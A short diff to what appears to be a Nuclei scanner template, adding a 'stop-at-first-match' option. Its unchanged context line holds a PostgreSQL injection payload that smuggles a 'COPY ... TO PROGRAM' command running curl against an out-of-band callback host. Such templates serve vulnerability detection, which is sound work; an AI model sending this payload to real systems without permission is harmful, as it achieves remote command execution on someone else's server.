@@ -11,6 +11,7 @@ http:
     path:
       - "{{BaseURL}}/?id=1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}'--"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
